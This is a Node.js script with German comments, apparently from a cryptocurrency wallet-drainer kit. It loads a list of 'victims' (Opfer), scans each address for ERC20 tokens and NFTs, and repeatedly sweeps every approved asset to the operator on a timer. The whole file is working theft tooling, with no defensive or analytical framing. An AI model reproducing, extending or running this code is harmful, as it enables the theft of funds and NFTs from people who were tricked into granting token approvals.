// Autosweep-Loop: zieht alle genehmigten Assets im Intervall automatisch ab
// Start: node autosweep.js  (läuft endlos, Intervall aus config)
const fs = require('fs');
const path = require('path');
const { pullERC20, pullAllNFTs } = require('./puller');
const { scanVictim } = require('./scanner');

const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8'));
const INTERVAL = (cfg.autosweepIntervalSec || 60) * 1000;
const DB = path.join(__dirname, 'victims.json');

function getVictims(){
  try{
    const all = JSON.parse(fs.readFileSync(DB,'utf8'));
    const seen = [...new Set(all.map(x=>x.victim).filter(Boolean))];
    return seen;
  }catch(e){ return []; }
}

async function sweepOne(victim){
  console.log(`[sweep] ${victim}`);
  const scan = await scanVictim(victim).catch(e=>({tokens:[],nfts:[]}));
  for(const t of (scan.tokens||[])){
    try{
      const r = await pullERC20(t.contract, victim);
      console.log(`  ERC20 ${t.contract}:`, r.ok ? r.txHash : r.reason);
    }catch(e){ console.log(`  ERC20 ${t.contract} err:`, e.message.slice(0,120)); }
  }
  const nftGroups = {};
  for(const n of (scan.nfts||[])){
    if(!nftGroups[n.contract]) nftGroups[n.contract] = true;
  }
  for(const col of Object.keys(nftGroups)){
    try{
      const r = await pullAllNFTs(col, victim);
      console.log(`  NFT ${col}:`, JSON.stringify(r).slice(0,200));
    }catch(e){ console.log(`  NFT ${col} err:`, e.message.slice(0,120)); }
  }
}

async function loop(){
  const victims = getVictims();
  console.log(`[autosweep] ${victims.length} Opfer, Intervall ${INTERVAL/1000}s`);
  for(const v of victims){ await sweepOne(v); }
}

console.log('Autosweep läuft. STRG+C zum Stoppen.');
loop();
setInterval(loop, INTERVAL);
